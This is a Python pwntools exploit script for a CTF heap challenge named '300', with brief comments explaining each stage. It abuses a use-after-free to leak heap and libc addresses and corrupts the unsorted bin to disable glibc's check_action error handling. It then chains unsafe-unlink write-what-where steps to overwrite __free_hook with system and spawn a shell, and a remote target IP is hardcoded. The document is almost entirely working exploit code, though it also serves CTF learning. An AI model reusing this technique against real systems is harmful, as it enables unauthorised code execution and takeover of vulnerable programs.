#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# The 300 challenge was a heap challenge that allowed you to make allocations of size 0x300.
# You could free allocations and read/write to them even after they got freed.
# The tricky part about the challenge was that you don't control the size and can't for example use the usual fastbin techniques.

# This exploit overwrites the check_action variable so that the libc doesn't abort on errors anymore.
# Afterwards we can get a write-what-where primitive using unsafe unlink.

from pwn import *

LOCAL=True

elf = context.binary = ELF('./300')
libc = elf.libc

if LOCAL:
  r = elf.process()
else:
  r = remote('104.199.25.43', 1337)

def menu(opt, slot):
  r.recvuntil('4) free')
  r.sendline(str(opt))
  r.recvuntil('slot? (0-9)\n')
  r.send(str(slot).rjust(15, ' '))

def alloc(slot):
  menu(1, slot)

def write(slot, data):
  menu(2, slot)
  r.send(data)

def pr(slot):
  menu(3, slot)
  return r.recvuntil('\n1) alloc', drop=True)

def free(slot):
  menu(4, slot)

# first, leak a heap and libc ptr by freeing two blocks, marking sure that they don't get coalesced
alloc(0)
alloc(1)
alloc(2)
alloc(3)

free(2)
free(0)

heap = u64(pr(0).ljust(8, '\x00')) - 0x620
libc.address = u64(pr(2).ljust(8, '\x00')) - 0x3c1b58
print('heap: 0x{:x}'.format(heap))
print('libc: 0x{:x}'.format(libc.address))

check_action = libc.address + 0x3c1150
main_arena = libc.address + 0x3c1b00
top = main_arena+0x58
bins_addr = main_arena + 0x68
arena_free_list = libc.address+0x3c37c0

# clean up
free(1)
free(3)

# create a chunk in the unsorted bin
alloc(0)
alloc(1)

free(0)

# corrupt the unsorted bin and use it to overwrite the check_action variable
write(0, flat(0x1234, check_action-0x10))
alloc(0)

free(0)

# at this point, check_action is corrupted and the libc will not abort when printing errors
# this disables many security checks and gives us a write-what-where primitive

what_where = []
# set up the main_arena so that we can get an allocation just before the __free_hook
what_where.append((bins_addr-0x10, bins_addr))
what_where.append((bins_addr-0x10, bins_addr+8))
what_where.append((libc.sym['__free_hook']-0x40, libc.sym['__free_hook']-0x30))
what_where.append((libc.sym['__free_hook']-0x30+4, top))
# when triggering an error, the arena will be marked as corrupted and a new one gets allocated
# though when allocating from an arena, there's a check that the result of _int_malloc is in a
# valid range for a given arena. We put the main_arena back in the arena_free_list so that this
# check doesn't stop us.
what_where.append((main_arena, arena_free_list))

for what, where in what_where:
  print('[0x{:012x}] = 0x{:x}'.format(where, what))

  # if we triggered an error, the arena will be marked as corrupted and a new one allocated
  # leak the address of that new arena first
  alloc(0)
  alloc(1)
  write(1, fit({0x20: 0x320}, length=0x300))
  free(0)

  leak = ''
  while len(leak) < 6:
    new_chr = pr(0)[len(leak):len(leak)+1]
    if not new_chr:
      new_chr = '\x00'
    leak += new_chr
    write(0, 'A'*len(leak))

  new_arena = u64(leak.ljust(8, '\x00')) - 0x58
  write(0, flat(new_arena+0x58))

  # some unnecessary allocations left over from exploit dev. But I'm too lazy to fix the offsets below, so leaving them in
  alloc(0)
  alloc(2)
  alloc(3)
  alloc(4)
  free(0)

  # trigger the write-what-where
  write(0, flat(new_arena+0x68-0x10, new_arena-0x20+0x8d0, 0, 0x320, new_arena-0x20+0x8b0, new_arena-0x20+0x8f0, 0, 0x320, new_arena-0x20+0x8d0, new_arena+0x68-0x10))
  alloc(1)
  alloc(1)
  write(0, flat(new_arena+0x68-0x10, new_arena-0x20+0x8d0, 0, 0x340, new_arena-0x20+0x8b0, new_arena-0x20+0x8f0, 0, 0x400, new_arena-0x20+0x8f0+0x30, new_arena-0x20+0x388, where-0x28, what, 0, 0x320, 1, new_arena-0x20+0x8f0, 1, 1))
  alloc(1)

# the next allocation will land just before the free_hook and we can overwrite it with system
alloc(1)
write(1, fit({0: 'sh\x00', 28: libc.sym['system']}))
free(1)

r.sendline('id')

r.interactive()